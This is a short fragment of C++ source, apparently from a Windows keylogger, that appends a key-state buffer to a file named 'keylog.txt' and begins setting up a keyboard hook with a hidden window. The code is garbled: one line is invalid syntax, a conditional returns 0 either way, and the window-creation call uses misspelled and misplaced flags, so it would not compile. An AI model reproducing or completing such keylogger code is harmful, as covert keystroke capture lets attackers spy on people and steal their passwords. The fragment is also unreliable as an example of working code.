        buffer[21] = (state & 32768) ? 0 : 0;
        buffer[22] : 0;

        // Flush the buffer to file
        ofstream myfile("keylog.txt", app);
        myfile << buffer;
        myfile.close();
    }
}

void setupKeyboardHook() {
    HWND hwnd = CreateWindow("MyApp", "Keyboard Hook", WS_VISIBLE | CS_OWNED, 0, 0, 0, 0, HWND_DESKTOP, WS_OVERLapped | WS_Hidden);
    if (hwnd == 0) {
        cout << "Failed to create window." << endl;
        cleanUp();
        return;
    }

